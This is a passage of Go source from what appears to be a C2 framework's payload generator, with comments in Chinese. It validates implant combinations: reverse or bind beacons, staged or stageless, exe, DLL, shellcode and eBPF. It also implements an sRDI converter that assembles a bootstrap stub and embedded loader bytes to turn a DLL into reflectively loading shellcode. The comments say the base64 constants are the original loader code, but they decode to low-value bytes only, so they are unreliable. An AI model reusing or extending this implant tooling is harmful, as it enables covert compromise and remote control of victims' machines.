package c2center

// 载荷矩阵(三期,契约 C2_CONTRACTS.md §19,Agent P 所有):
//   1. 合法组合表与 ValidatePayloadCombo(契约 §19 逐字落地,前后端同一份语义);
//   2. 编译型产物源码渲染(exe/dll/shellcode 的 Go 源码工程 + staged 的极简 stager);
//   3. sRDI 转换器(纯 Go,DLL → shellcode,本进程内做 patch 流程,不执行任何代码);
//   4. eBPF 触发器源码资产(嵌入导出,供 VPS 构建管线取用)。
//
// 边界纪律:本文件只产出「源码文本/字节」,不发网络请求、不碰文件系统、不 import
// db/server(包边界,契约 §0)。模板里的进程执行 import 以 "os"/"exec" 两段拼接——
// 那是「载荷内容」数据,不属于本包依赖,本包源码不得出现该 import 路径字面量
// (与 beacon.go 的 quotedExecImport 同纪律,复用之)。
//
// 与 Agent T 的冲突面控制:本文件对 beacon.go 既有模板只做同包只读引用
// (gosrcTemplate/zipGoSource/quotedExecImport),对其输出文本做追加式变换
// (bind 信道注入 / c-shared 包装),不改其任何一行;beacon.go/protocol.go 零改动。

import (
	"archive/zip"
	"bytes"
	"embed"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"sort"
	"strconv"
	"strings"
)

// ---- 1. 合法组合表(契约 §19 freeze)----

// 产物形态(c2_payloads.artifact,schema CHECK 白名单)。
const (
	ArtifactScript    = "script"
	ArtifactExe       = "exe"
	ArtifactDll       = "dll"
	ArtifactShellcode = "shellcode"
	ArtifactEbpf      = "ebpf"
)

// 连接方向(c2_payloads.direction)。
const (
	DirectionReverse = "reverse" // beacon 连回平台
	DirectionBind    = "bind"    // beacon 监听,平台主动连
)

// ValidPayloadArtifact 校验产物形态白名单。
func ValidPayloadArtifact(a string) bool {
	switch a {
	case ArtifactScript, ArtifactExe, ArtifactDll, ArtifactShellcode, ArtifactEbpf:
		return true
	}
	return false
}

// ValidPayloadDirection 校验连接方向白名单。
func ValidPayloadDirection(d string) bool {
	return d == DirectionReverse || d == DirectionBind
}

// ValidatePayloadCombo 契约 §19 合法组合表(逐字落地;非法组合返回人话原因):
//   - script:ps1/bash/py × reverse|bind × stageless(script 不做 staged);
//   - exe:gosrc 编译 × reverse|bind × staged|stageless;
//   - dll:gosrc c-shared 编译 × reverse|bind × stageless;
//   - shellcode:dll 产物经 sRDI 转换 × reverse|bind × staged|stageless;
//   - ebpf:仅 linux × bind(format 固定 gosrc;不做 staged)。
//
// 目标平台一致性(ebpf→linux、dll/shellcode→windows)见 ValidatePayloadArtifactTarget;
// 监听器协议支持面见 ValidateArtifactChannelSupport。
func ValidatePayloadCombo(format, artifact, direction string, staged bool) error {
	if !ValidPayloadDirection(direction) {
		return fmt.Errorf("无效连接方向: %q(仅 reverse=回连 / bind=正向)", direction)
	}
	switch artifact {
	case ArtifactScript:
		// script:ps1/bash/py × reverse|bind × stageless(script 不做 staged)。
		switch format {
		case "ps1", "bash", "py":
		case "gosrc":
			return errors.New("script 产物只承载解释型脚本(ps1/bash/py);Go 源码请选 exe 产物(经 VPS 编译)")
		default:
			return fmt.Errorf("无效载荷格式: %q(script 产物仅 ps1/bash/py)", format)
		}
		if staged {
			return errors.New("script 产物不支持 staged(script 不做 staged;仅 exe/shellcode 支持 stage 模式)")
		}
	case ArtifactExe:
		if format != "gosrc" {
			return errors.New("exe 产物由 gosrc 源码编译,格式固定为 gosrc")
		}
	case ArtifactDll:
		if format != "gosrc" {
			return errors.New("dll 产物由 gosrc 源码编译,格式固定为 gosrc")
		}
		if staged {
			return errors.New("dll 产物不支持 staged(契约组合表:dll 仅 stageless;staged 请选 exe 或 shellcode)")
		}
	case ArtifactShellcode:
		if format != "gosrc" {
			return errors.New("shellcode 产物由 gosrc 源码编译出 DLL 后经 sRDI 转换,格式固定为 gosrc")
		}
	case ArtifactEbpf:
		if format != "gosrc" {
			return errors.New("ebpf 触发器工程的 bind beacon 由 gosrc 源码编译,格式固定为 gosrc")
		}
		if direction != DirectionBind {
			return errors.New("ebpf 触发器仅支持 bind 方向(契约:ebpf 仅 linux × bind)")
		}
		if staged {
			return errors.New("ebpf 触发器不支持 staged")
		}
	default:
		return fmt.Errorf("无效产物形态: %q(仅 script/exe/dll/shellcode/ebpf)", artifact)
	}
	return nil
}

// ValidatePayloadArtifactTarget 目标平台一致性(契约 §19:ebpf 仅 linux;
// dll/shellcode 链路按 PE/c-shared DLL 与 sRDI 设计,仅 windows;exe 不限)。
func ValidatePayloadArtifactTarget(target, artifact string) error {
	switch target {
	case "windows", "linux", "macos", "cross":
	default:
		return fmt.Errorf("无效目标平台: %q(仅 windows/linux/macos/cross)", target)
	}
	switch artifact {
	case ArtifactEbpf:
		if target != "linux" {
			return errors.New("ebpf 触发器仅支持 linux 目标(契约:ebpf 仅 linux × bind)")
		}
	case ArtifactDll, ArtifactShellcode:
		if target != "windows" {
			return errors.New("dll/shellcode 产物仅支持 windows 目标(c-shared DLL 与 sRDI 链路按 PE 设计)")
		}
	}
	return nil
}

// ValidateArtifactChannelSupport 监听器协议支持面(编译型产物;三期模板现状):
//   - stageless reverse:beacon 源码复用 RenderPayload 管线,四传输(http/ws/tcp/kcp/oss)
//     均已支持;kcp 源码依赖第三方库,构建管线在 VPS 上 `go mod init + go get` 后编译
//     (需 VPS 可访问 Go 模块代理);
//   - bind:走 goBindChannelBlock(tcp 帧),且平台正向拨号(NewOutboundConn)仅 tcp/kcp
//     ——http 监听器的密钥/信封与帧信道同源,故 http/tcp/kcp 均可;ws/oss 拒绝;
//   - staged reverse:stager 自带信道只有 HTTP 回连(极简优先)→ 仅 http 监听器;
//   - script 产物不受本闸(由 RenderPayload 统一处理)。
func ValidateArtifactChannelSupport(artifact, direction string, staged bool, proto string) error {
	if artifact == ArtifactScript {
		return nil
	}
	switch proto {
	case "http", "ws", "tcp", "kcp", "oss":
	default:
		return fmt.Errorf("无效监听器协议: %q", proto)
	}
	if direction == DirectionBind {
		switch proto {
		case "ws", "oss":
			return fmt.Errorf("bind 的编译型产物(%s)暂不支持 %s 监听器(正向连接仅 tcp/kcp 拨号)", artifact, proto)
		}
		return nil
	}
	if staged && proto != "http" {
		return fmt.Errorf("staged 产物的 stager 目前仅支持 http 回连信道;%s 监听器请选 stageless 或 http", proto)
	}
	return nil
}

// ValidateBindPort bind 方向的端口要求:bind 产物要在目标机监听一个端口(必须显式给),
// reverse 恒为 0。
func ValidateBindPort(direction string, bindPort int) error {
	if direction == DirectionBind {
		if bindPort < 1 || bindPort > 65535 {
			return errors.New("bind 方向必须在目标机监听端口,请提供 1-65535 的 bind_port")
		}
		return nil
	}
	if bindPort != 0 {
		return errors.New("reverse 方向不需要 bind_port(目标机主动回连,端口由监听器决定)")
	}
	return nil
}

// ---- 2. sRDI 转换器(纯 Go)----
//
// attribution(契约 §19:bootstrap/载入器常量来自开源 sRDI 项目,BSD-3-Clause):
//   项目:  sRDI — Shellcode Reflective DLL Injection
//   作者:  Nick Landers (monoxgas),<https://github.com/monoxgas/sRDI>
//   许可:  BSD-3-Clause(sRDI 仓库 LICENSE)
//   来源:  Python/ShellcodeRDI.py @ commit 9fdd5c44383039519accd1e6bac4acd5a046a92c
//          (master,2022-06-17;rdiShellcode64/rdiShellcode32 常量与 ConvertToShellcode
//          的 bootstrap 构造逻辑逐字对齐)
//   衔接:  rdiShellcode* 内嵌的是 Stephen Fewer 的 ReflectiveDLLInjection 载入器
//          (BSD-3-Clause,https://github.com/stephenfewer/ReflectiveDLLInjection),
//          sRDI 仓库已将其编译为位置无关机器码,此处原样携带(base64 防转义失真)。
//
// 实现:Go 重写 ConvertToShellcode 的「纯字节 patch 流程」——拼装
// [bootstrap(69/50B,运行期算好偏移)][RDI 载入器][DLL][userData]。
// 不执行任何代码、不碰进程;转换产物的实际可用性由使用环境决定。

// srdiLoaderX64Base64 / srdiLoaderX86Base64 是 sRDI 仓库携带的 RDI 载入器机器码
// (ShellcodeRDI.py 顶部 rdiShellcode64/rdiShellcode32 的 base64;x64 优先)。
const (
	srdiLoaderX64Base64 = "" +
		"BAgMBAgFAAQIBAIECAQBCAUBBQUFBAUEBQQFBAUECAYCCQQIDgcAAAAEAw8MBA0GAAYABAgPBAgHDwsBCQsLBAgHDAQIDgQI" +
		"BwAECAQGBAgHAQQIBAsECAQKBAgHAAQIBw4ECAcBBAgHAgQIBwICDAQNBwAGAAwEDQYABgAMBA0DAAMADAQOAgAGAAwEDgYA" +
		"BgAMBAIEBQYGBgwEAgQHDAQCBQQGBgYMBAIFBAYGBwwEAgYGBwcEDAQCBAUGBwcMBAIEBwYGBAwEAgUGBgYGDAQCBgUGBwcM" +
		"BAIGBwYGBQwEAgcHBgcGBgwEAgcGBwwECgQGBwcMBAoGBAYHDAQLBwcHBgwECwcGBgYMBAsEBgYGDAQCBwQGBwQMBAIHBgcG" +
		"BwwECAYFBwcMBAgHBgYEBgwECAYGDAQIBgwECQUHBgQMBAkGBgQHDAQJBgYHBgwECQYGBQYGDAQKBgYOBgAAAAsLBA0FBAgN" +
		"DgUAAAAECA4ECAQPBAgEDQwEAgEAAQAECAQCAwQIBAIECAQCAw0DDA8NBAgEAgMECAQCBAQDDAQIBAICBAgEDAwEAgIAAAAA" +
		"BAgFAgIEDw0ECAQCAwQIBAIGBAMMBAgEAgIECAQADAQCAgAAAAAECAUCAgQPDQwEAgIBAAEABAgEAgMECAQKBAMMBAgEAgIE" +
		"CAQABAgFAgIEDw0ECAQCAwQIBAIHBAMMBAgEAgIECAQBDAQCAgEAAQAECAUCAgQPDQQIBAIDBAgEAgQEAwwECAQCAgQIBA4M" +
		"BAICAAAAAAQIBQICBA8NBAgEAgMECAQJBAMMBAgEAgIECAQBDAQCAgEAAQAECAUCAgQPDQQIBAIDBAgEAgUEAwwECAQCAgQI" +
		"BA8MBAICAAAAAAQIBQICBA8NBAMHDAAIAAAAAAQDBwAACA8AAAAEAwcOAAgOAAAABAMHAAAIDgAAAAQIBAEECAwACA0AAAAE" +
		"BgcDBAAPCAMFBAAAAAgMAAAACwYIAAAGAwQAAAgLAAAABAgEAwQIBQAECAwACAoAAAAACwQBBAgNBAgMAgYEAwcABwIEAAsF" +
		"AAQADAgEAAgBCAwHAAQIAAEOAAAMAwwABAwECAwCCA0EAg0HDQQIBAMEDw0IBQMECAwECAcPDw0EAAcFBAgEDwgMBAIPCAwE" +
		"AAwECAQPBA8NBAIMBAMPAAgDAAAABAgEAwQLAAAAAAQLAAMAAAQIDQ8FDAQIDQQIDAcBBAgEAAQLAAMAAAQIDQMMDwUMBAgN" +
		"BAsAAAAABAgJDQAAAAcBCAQDCAQDCAUDDgAIDAQADQgAAwgAAQMFBQcPDgEECA0EAwcFBwEIDAQADQgAAwgAAQMFBQcPBAYH" +
		"AwQIDQQADwQIBwMEAAsEAQQIDAIGBAMHAAcDBAAMBAgMBAMDBwEECAUABAgEDwQIDAQADAQADAQADQgAAwgAAQQDAAcOAAsE" +
		"AAQADQQIDAIEAw0HDAQIDwQLAAAAAAQCBwMACA0AAAAEAwsLAAAAAAgMAAAABAgICwAAAAQADAQDAwAICwAAAAQIBQAOCQAA" +
		"AAQACwEEAAsMBAALDAYMDgAGCA8ABwIECAAECA4PAAAABAgAAQQIAQEECAABBAsAAAAABAANBAgBAQQIBAAOBAQLAAAAAAYI" +
		"DwAHAAIPAAAABAgAAAQIDA4CBgQDDAcBAg8AAAAECAAABAgMBAwOAQALDA4BBgQDDAcBAg8AAAAECAAABAALDAQIAQQAAAAE" +
		"AA0ECAQABAAMBAMNAAgFDw8PBAgMBAMDAAgEDw8PBAMLCQAAAAAICQAAAAgICQAAAAQIDgQIAAEECAQADgAEAA4ECAQBBAMD" +
		"Bw8ICA0AAAAECA4IDgAIBAwIDAAICAAAAAQDDgAICAAAAAQICg0AAAAECAUPBAwOAQQIDQQIDQcGBAgMBAsPBwAABAABAAMN" +
		"BAgMBAIMBg8PBAAABAgMDw8DDQgMDAkCAAgEAAgMDA4BBAIMDw8EAAwEDwwECAAIBAgFCAEEAAEACAQAAQAIBAgEAQQIBAgB" +
		"BAABAAQIBQEECAQBBAMNBwoICAkAAAAIDwQADwgEAAgMAAgLAAAACAcMCAwEAAwPBQ8ECAQCAwQIDQQIAwQIBwEEAA8EAA8E" +
		"CAAECAwHBgQIBw8ECAwHAAQACwADDQ4DBAgFAAMMBAANAwAHAAQIDAQPDAQPDAgDAAcPBAgFAgIEAwwECAUCAgYIBAICBggE" +
		"AgIECAwECAwPDQQIDAAECAwABAgABAgMBwAECAUCAw4KCAcMBAMPBAgOBwEIDwcBBAgPAAcABAYMDgAAAA8FDggEAgQIDAEI" +
		"DAAIBA8PDwQIBwMECAoLAAAABAgGDwQDCw8AAAAACAsAAAAECAsPAAAABAgMAAQADwQIAAgMAAgJAAAABAsCAAAACAwEAAwP" +
		"BQ8ECAQCAwQIDAQIBwAECAcABAAPBAAPBAgDAAcFBAgBBAgNBwAEAAsMAw0OAwQIBAADDAQADAQDAAcABAgNBA8MBA8MCAMA" +
		"Bw8ECAQCAgQIBQICBAMMBggEAgIGCAQCAgQIDAQPDQQIDAAECAwABAgDAAcABAgEAgMOCgQADwQIAAgMAAgHDw8PBAgKCwAA" +
		"AAQDDwALBwEECA8ECAwCBAsAAAAABgQDBwAACAoAAAAEAA8ECAYCAQQDAwcHCAQBCAwIDgAAAAQACw4BBwIIDAcACAwECAQA" +
		"BAAEDA4DBAsAAAAACAwECAQPBAAEDA4CCAwHAQsBAAAACAwECAQHBAAEDA4ACAwECwQAAAAEAAQMBAgEAgMPBAEAAAAABwAE" +
		"AAsOAAQIBAIDCAQPBAgEAgMIAQQADA8FAAALBAAEAA8ECAwCBAMPAAgGDw8PBAgKCwAAAAQDDAMNBAgMDw8FAAQDCw0AAAAH" +
		"AggIDQAAAAQIBwEBDgAEAwwECA0ECAwPDQQIBwAECAAECAwHDgQIBAEECAwHAggICgAAAAgMBwIIDAQIDAQLCgoKCgoKCgoE" +
		"Dw4ICAoAAAAEDA4ABAAMBAINBA8NCAQCBAgMBAAMBAgNBAgMDw0ECA4ACAsAAAAEAwsIAAAAAAgKAAAACAgIAAAABAAMBAgF" +
		"AQQIDQAICQAAAAQDBwEACAgAAAAECAQCBAgPCAUCBAAMBAANBAgNBwcECAAECA0EAAwHBgQIAAgMBwEEAAwACwwEAA0EDAwA" +
		"BAgACAwHDgQDDgcABAgNBwEEAA8ECAwABAgMAAQDDwcDDgsIBAEACwAEAAwECAAIBAAMDwgNAAAAAAcABAgIDQAAAAsAAAAA" +
		"DgAICQwAAAAECAgMAAAABA8NBAgMDgADDAQICQILAAAABAgMBwAAAAQFBAUEBQQFBQUFDAQIDAQIBQAECAYBBAgHAQQIBwIE" +
		"BQQIDgEGBAgAAgYAAAAIDgQDDwQIBQEECAUBBAgEAwQIDAAICwAAAAQAAQQFBAYEAwQIDQQIAQ8ABwACBAgJAAgAAAAECA0H" +
		"DQQIAAIEDA4BBgQDDwcCBAgEAgAEAAsMAAsADAwACAMGBwAIDA4ADQQPDAQIDgAHDgQIAwEECAQBCAQCBA8MBAAMBAgDCA4C" +
		"CAEECA0EAA0ECAcPAAsABA8MBAwMAAQADQgMBw4ECAABAwwHAAQPDAQIDwAHDQ4FDw8PCAQCBAgAAAQADAALAQAIBAEEAAwI" +
		"AAkEAAwOAAMMBAgFAgIECAYCAgQIBwIDBAgHAgMECAwBBAUM"

	srdiLoaderX86Base64 = "" +
		"CA4BAAAABQUFBQYGBQYGBggIAgwAAAADDgUGBwUGBgUGBgUGAwYICAIMAAAABggIAg0AAAAFBgMGCAgCDQAAAAUGAgYICAIN" +
		"AAAABQYGBggIAg0AAAAFCAoCCwAAAAgGAgMICgILAAAACAoCDAAAAAgKAgsAAAAICgILAAAACAoCDgAAAAYICAIMAAAABggJ" +
		"AgwAAAAGCAkCDQAAAAYICAINAAAABggJAg0AAAAGCAkCDQAAAAwEAgMFCAUCAwYMBAIDBgYMBAIEBwYMBAIFBAYMBAIFBggE" +
		"AgUGDAQCBQQGDAQCBQYIBAIFDAQCBQYIBAIFBgwEAgUHBAYMBAIEBQYIBAIEBgwEAgQHBwwEAgQGCAUCBAwEAgQECAUCBAgF" +
		"AgQGDAQCBAYGBgwEAgUFBggEAgUGDAQCBQcHDAQCBgYIBQIGDAQCBgUIBAIGDAQCBgYHBgYMBAIGBwwIAgkAAAAECAkCCQAA" +
		"AAwIAgkAAAAHBwYECAkCCQAAAAYMCAIJAAAABwcICAIJAAAADAgCCQAAAAcGBwYMCAIKAAAABgYGBQgIAgoAAAAIBAIGCAQC" +
		"BwgEAgcICAIJAAAACwEJCwsICQIKAAAADAgCCgAAAAQGBgYMBAIGBAwEAgYHBAYHBgwEAgcGBwwEAgcFBwcHBgwEAgcGBAgF" +
		"AgcGDAQCBwYGBgwIAggAAAAFBwgJAggAAAAMCAIIAAAABAgIAggAAAAICAIIAAAABgwIAggAAAAEBwgJAggAAAAMCAIIAAAA" +
		"BgcGBggJAggAAAAGDAgCCAAAAAUGDAgCCQAAAAYICQIJAAAADgQAAAALCwQNBQgPDgMAAAAIDQgIAgwAAAAGAQgIAg4AAAAF" +
		"BggIAg4AAAAGCAgCDgAAAAgEAgEFCAgCDgAAAAgFAgMFBQUPDQYABQgEAgQGCAcCAQgEAgEIBAIDBQUIBAIBBggHAgEFDwcC" +
		"Ag8NBgAFBggEAgEGCAQCAQgEAgUIBAIBCAgCCwAAAAUFCAQCAQUPBwICDw0GAQUGCAQCAQYIBAIBCAgCCQAAAAgEAgEICAIL" +
		"AAAABQUIBAIBBQ8HAgIPDQYBBQgEAgYGCAcCAQgEAgEICAIMAAAABQUIBAIBBggHAgEFDwcCAg8NBgAFBggEAgEGCAQCAQgE" +
		"AgMIBAIBCAgCCwAAAAUFCAQCAQUPBwICDw0ICAIIAAAABggHAgEIBAIBCAgCDgAAAAUFCAQCAQYIBwIBBQ8HAgIPDQgEAgUG" +
		"CAcCAQgEAgEICAILAAAABQUIBAIBBggHAgEFDwcCAg8NAwYCAwAIDQAAAAMKAgsAAAAACAwAAAADCgILAAAAAAgLAAAAAwoC" +
		"CwAAAAAICgAAAAgKAgwAAAAIDgAICQAAAAgLAgIAAAAIBwMADwgDBQQAAAAICAAAAAsEAAAABgMEAAAIBwAAAAgEAwoAAAgG" +
		"AAAAAAsEAQMNAAsFAAgMAggNBwIADAgHAAAIAwcACAQAAAwDDAAEDAgMAggNCAQDCA4ABw4ICwICAAAACAgCAAAAAAUPDQgI" +
		"AgAAAAAIBQ8IBg8PDQAGBQgEDwAMAg4CDAMOAAgAAAAABgAGAAMAAAUPBwMPBQIECA0IBQIDCA0HAQYABgADAAAFBQ8FAgQI" +
		"DQgEAgMPCAIDAAAAAAcCCAQDCAQDCAQDAwQFBwIIDggBAAIOCAACBAgABAMEBQcPDgEDDgMGBQcBCA0IDAINCAABBAgABAMG" +
		"BQcPCAYDAwwADggEAgEDDAgGAgIACwcBCAwCBgMEAAcDAA8IBgICAAgDAAcCCAYCAggEAAgBAggEDwAMBAgAAwgAAAMCBw4I" +
		"BgICCAQCAQALBAAECAwCCAQCAQMMBwwIDAIEAwgEAgIACAsAAAAICwoAAAAAAAgKAAAACAsKAAAAAA8IAwAACAkAAAAIDggH" +
		"AA4HAAsABggMAAsNBgwOAAYIDwAHAggBCA4PAAAACAQCAggAAQgAAAgAAQgFAgIADAgAAQ4DBggPAAcACAAIDg8AAAAADQAC" +
		"AA4CAwwEBgMMBwAIDAwOAQ4ABgAFBgMMBwEACwwIAAgODwAAAAANAAAABgAFAA8IBAAADAMPBwgIAwAIDwAIBw8PDwgGAgII" +
		"CwICAAAACAsIAAAAAAAIDgAAAAgLCAAAAAMMCAgCCgAAAAgAAQgEAgIIDAADAAcBCAQBBAgDAAcPCAgCCgAAAA8IAgMAAAAA" +
		"CA0ACAwAAAADDAQDDAAIDAAAAAgIAgMAAAAIBQ8ICgIMAAAAAAgFAgIIDQwOAQgHDwgEAgEIDwAICgAAAAgHAgIIDQgKAgwA" +
		"AAAIDAYPDwQAAAIMAw0LDwcAAA8PCAwMCQIAAw0ICwICAAAABgAIBAAIDAwOAQgLAg8AAAACDwcAAA8PBQAMBgwBBgAADAQI" +
		"Dw8KBQgPCA8ICAIKAAAADwoGAAgPCAsCDwAAAAUPCggLAgIAAAAIDAEIBwICAwYCAgcICAYCAggFAgMIBAIBCAkIAAAADgAI" +
		"BAICCAQCAQgDAQgFAAgHAgMIDQAIDAAAAAgMAggCAwAAAAgOAAgIAgwAAAAIAAEFDwkCCwAAAAgNCAUCAQgDCAYBAA8ADggA" +
		"CAwHBQgHAgMIDAcAAAsABQUGAA4DCAwAAwwADAgEAgIDAAcABAQIAwAHDwgEAgIFBggEAgEGCAQCAQgEAgEGAAgEAgEFBQ8N" +
		"CAwACAwACAAIDAcACAUCAQ4KCAcCAwgLAgwAAAAABwEDDAQDCAIKAAAABwEGBAIBDgAAAAUPCQILAAAACAUCCAwBCAcCAwgN" +
		"AAgEDw8PCAYCAggLDgAAAAAGAgUACAoAAAAICA4AAAAIDAAADAgEAgEIAAgMAAgJAAAACAYCAQAMBQ8JAgsAAAAIDAgEAgEI" +
		"BwAIBwAADwAPCAMABwUIBgIDCAEIDQcABQALDAUGAA4DCAwAAwwADQgFAgIDAAcABAQIAwAHDwgFAgIFBggEAgEGCAQCAQgE" +
		"AgEGAAgFAgEFBQ8NCAwACAwACAMABwAIBAIBDgoIBgIBBgIFAA4IBgIBCAQACAwACAcPDw8IBgICAAsHAQMMCAwCAw8GAwQA" +
		"AAgIAAAAAA8IAwAHBggEAQgMAgAAAAQPDAAAAAIHAQgMBwAGAAUGAAgMBQAEDA4BBgAFBgAODwgMBwAGAQsIAAAABQ4ABgQF" +
		"CAwABAwIBAICDwQBAAAAAAcAAAAAAAAIBAICCAQCAgUFCAQPDwMADAUPCQIMAAAAAAsEAAQIDAIGAgUDDwcIBgAGAAYPDwkC" +
		"DAAAAAgLDAAAAAAHAggIDAAAAAgHAQAIAAgMBwEDDgQGAAUFDw0IBwAIAAgMBw8IBgICAwwEBQUIBAIFAAwPDQgLAgIAAAAA" +
		"AAgMAAAACAcHAAAICwAAAAgFBwANCAYBCA4ACAoAAAAIBwEAAAgJAAAACAcCCAQCAA8IBgIDAAAMCA4ACAgAAAAIAwYABQgE" +
		"AgEADwcHCAAIDAcCCAYCAQALDAAODAwABAgACAwHDwgGAgEIBAIBCAYBAwgCAgAAAAcACAwHAQgEAgMIDAAECAwACAQCAwMM" +
		"BwoOAwALAAgEAQgACAgAAQAMDwgCAwAAAAAHAAYADwsCAwAAAA4ADwsCAwAAAA8LAgMAAAAPDQUFCAwOAAMMBQUFBQgMAQAA" +
		"AAwIDgEGCgMAAAAFBQUIBAAFCAQCAQgHAA4KAAAACAQDAw8IBQIIAwgEAgEIBAMIBwIBCAYBBwgGAgEIDgAICAAAAAwOAQMM" +
		"CA0HAggHAgEACwIADAwACAMABggGAgEHAAgMCAwOAA8OAAAHAgEEAwwHDQgHAgEIBgIBCAQCAgMNCAQCAQAMCAQCAQgMBwMI" +
		"AwMOAA8IDAAIBAICCAAMDAAACwwADgQIDAcPCAcCAQgAAgMEAgEHAggEAgIEAwUCAQcMCAUBCA0ACAUPDw8DDAUFBQUIDAEM" +
		"CAcCAQgEAQIIAAUACwABCAQBAQgACAgAAQAMDg0="
)

var (
	srdiLoaderX64 []byte // init 里解码;x64 优先
	srdiLoaderX86 []byte
)

func init() {
	if b, err := base64.StdEncoding.DecodeString(srdiLoaderX64Base64); err == nil && len(b) > 0 {
		srdiLoaderX64 = b
	}
	if b, err := base64.StdEncoding.DecodeString(srdiLoaderX86Base64); err == nil && len(b) > 0 {
		srdiLoaderX86 = b
	}
}

// sRDI flags 位(与 ShellcodeRDI.py 一致):0x1 载入后清 PE 头;0x8 把 shellcode
// 基址作第 5 参传给导出函数。0x4(导入混淆,高位放延迟秒数)暂不开放。
const (
	SRDIFlagClearHeader       = 0x1
	SRDIFlagPassShellcodeBase = 0x8
)

// ror13 是 sRDI/RDI 系哈希的循环右移。
func ror13(v uint32) uint32 { return (v >> 13) | (v << 19) }

// HashExportName 复刻 sRDI HashFunctionName(无模块版):ROR13 滚动含结尾 \0 的
// 导出函数名字节。ConvertDLLToShellcode 用它把导出函数名(如 "Run")编进 bootstrap。
func HashExportName(name string) uint32 {
	var h uint32
	for i := 0; i < len(name); i++ {
		h = ror13(h) + uint32(name[i])
	}
	h = ror13(h) // 结尾 \0:+0
	return h
}

// srdiIs64BitDLL 判断 PE 位数(对齐 ShellcodeRDI.is64BitDLL:e_lfanew@0x3C →
// machine@pe+4;0x8664=AMD64 / 0x0200=IA64 视为 64 位)。
func srdiIs64BitDLL(b []byte) (bool, error) {
	if len(b) < 64 {
		return false, errors.New("srdi: 输入不足 64 字节,不是合法 PE")
	}
	off := int(binary.LittleEndian.Uint32(b[60:64]))
	if off <= 0 || off+6 > len(b) {
		return false, errors.New("srdi: e_lfanew 越界,不是合法 PE")
	}
	if string(b[off:off+4]) != "PE\x00\x00" {
		return false, errors.New("srdi: PE 签名缺失,不是合法 PE(DLL)")
	}
	machine := binary.LittleEndian.Uint16(b[off+4 : off+6])
	return machine == 0x8664 || machine == 0x0200, nil
}

// srdiBootstrap 构造 bootstrap 存根,字节级行为对齐 ShellcodeRDI.py:
//
//	x64(69B):call/pop 取基址 → edx=函数哈希、r8=userData 地址、r9d=长度 →
//	          [rsp+0x28]=基址、[rsp+0x20]=flags → call 进 RDI(跳过栈修复尾);
//	x86(50B):cdecl 连续 push(flags/base/长度/userData 地址/哈希/DLL 地址)后 call。
func srdiBootstrap(is64 bool, functionHash, flags uint32, dllLen, userDataLen int) []byte {
	loaderLen, size := 0, 50
	loader := srdiLoaderX86
	if is64 {
		loader, size = srdiLoaderX64, 69
	}
	if loader != nil {
		loaderLen = len(loader)
	}
	b := make([]byte, 0, size)
	b = append(b, 0xe8, 0x00, 0x00, 0x00, 0x00) // call $+5(压入下条指令地址作基址)
	dllOffset := size - len(b) + loaderLen      // 与 Python 同式:此刻 len(b)==5
	if is64 {
		b = append(b, 0x59)             // pop rcx
		b = append(b, 0x49, 0x89, 0xc8) // mov r8, rcx
		b = append(b, 0xba)             // mov edx, <hash>
		b = binary.LittleEndian.AppendUint32(b, functionHash)
		b = append(b, 0x49, 0x81, 0xc0) // add r8, <userData 位置>
		b = binary.LittleEndian.AppendUint32(b, uint32(dllOffset+dllLen))
		b = append(b, 0x41, 0xb9) // mov r9d, <userData 长度>
		b = binary.LittleEndian.AppendUint32(b, uint32(userDataLen))
		b = append(b, 0x56)                   // push rsi
		b = append(b, 0x48, 0x89, 0xe6)       // mov rsi, rsp
		b = append(b, 0x48, 0x83, 0xe4, 0xf0) // and rsp, 0xFFFFFFFFFFFFFFF0
		b = append(b, 0x48, 0x83, 0xec)       // sub rsp, 0x30
		b = append(b, 0x30)
		b = append(b, 0x48, 0x89, 0x4c, 0x24) // mov [rsp+0x28], rcx(第 5 参:基址)
		b = append(b, 0x28)
		b = append(b, 0x48, 0x81, 0xc1) // add rcx, <dllOffset>
		b = binary.LittleEndian.AppendUint32(b, uint32(dllOffset))
		b = append(b, 0xc7, 0x44, 0x24) // mov [rsp+0x20], <flags>(第 6 参)
		b = append(b, 0x20)
		b = binary.LittleEndian.AppendUint32(b, flags)
		b = append(b, 0xe8) // call RDI(越过 5B 栈修复尾)
		b = append(b, byte(size-len(b)-4), 0x00, 0x00, 0x00)
		b = append(b, 0x48, 0x89, 0xf4) // mov rsp, rsi
		b = append(b, 0x5e)             // pop rsi
		b = append(b, 0xc3)             // ret
		return b
	}
	b = append(b, 0x58)       // pop eax
	b = append(b, 0x55)       // push ebp
	b = append(b, 0x89, 0xe5) // mov ebp, esp
	b = append(b, 0x89, 0xc2) // mov edx, eax
	b = append(b, 0x68)       // push <flags>
	b = binary.LittleEndian.AppendUint32(b, flags)
	b = append(b, 0x50)       // push eax(基址)
	b = append(b, 0x81, 0xc2) // add edx, <userData 位置>
	b = binary.LittleEndian.AppendUint32(b, uint32(dllOffset+dllLen))
	b = append(b, 0x68) // push <userData 长度>
	b = binary.LittleEndian.AppendUint32(b, uint32(userDataLen))
	b = append(b, 0x52) // push edx
	b = append(b, 0x68) // push <hash>
	b = binary.LittleEndian.AppendUint32(b, functionHash)
	b = append(b, 0x05) // add eax, <dllOffset>
	b = binary.LittleEndian.AppendUint32(b, uint32(dllOffset))
	b = append(b, 0x50) // push eax
	b = append(b, 0xe8) // call RDI
	b = append(b, byte(size-len(b)-4), 0x00, 0x00, 0x00)
	b = append(b, 0x83, 0xc4, 0x14) // add esp, 0x14(cdecl 清栈)
	b = append(b, 0xc9)             // leave
	b = append(b, 0xc3)             // ret
	return b
}

// ConvertDLLToShellcode 把 DLL 转成 sRDI shellcode(纯字节拼装,不执行任何代码):
// 输出 = [bootstrap][RDI 载入器][DLL][userData],执行时按 functionHash 调用指定
// 导出函数(平台产物固定调 "Run"),userData 作其唯一参数。
func ConvertDLLToShellcode(dllBytes []byte, exportName string, userData []byte, flags uint32) ([]byte, error) {
	if len(dllBytes) == 0 {
		return nil, errors.New("srdi: DLL 输入为空")
	}
	if userData == nil {
		userData = []byte{}
	}
	if len(userData) > 0xFFFFFFFF {
		return nil, errors.New("srdi: userData 过长(>4GB)")
	}
	is64, err := srdiIs64BitDLL(dllBytes)
	if err != nil {
		return nil, err
	}
	functionHash := HashExportName(exportName)
	if functionHash == 0 {
		return nil, fmt.Errorf("srdi: 导出函数名 %q 哈希为空", exportName)
	}
	var loader []byte
	if is64 {
		loader = srdiLoaderX64
	} else {
		loader = srdiLoaderX86
	}
	if len(loader) == 0 {
		return nil, errors.New("srdi: RDI 载入器常量解码失败(内置常量损坏)")
	}
